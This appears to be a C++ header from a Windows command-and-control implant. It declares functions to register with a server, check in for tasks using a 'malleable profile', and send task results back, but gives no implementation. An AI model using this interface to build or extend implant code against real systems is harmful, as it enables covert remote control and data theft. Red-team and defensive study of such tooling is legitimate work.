/**
 * This file functions that are required for the implent to function.
 * Notably: register and checkin.
*/

#ifndef IMPLANT_H
#define IMPLANT_H

#include <windows.h>
#include "./rapidjson/document.h"
#include "./rapidjson/writer.h"
#include "profile.h"
#include "task.h"
#include "constants.h"

/**
 * Registers with the server at the given URL and returns a MalleableProfile.
 * If registrtion fails, it returns NULL.
 * 
*/
MalleableProfile* Register(LPCWSTR serverUrl, std::string pubKey, std::string privKey);

/**
 * Checks in with the server at the given URL and returns a Task.
*/
Task* Checkin(LPCWSTR serverUrl, MalleableProfile *profile);

/**
 * Sends the results of a task to the server at the given URL. Returns true if successful, false otherwise.
*/
bool SendTaskResult(LPCSTR taskId, LPCWSTR serverUrl, std::string results, bool success, MalleableProfile *profile);

#endif // IMPLANT_H
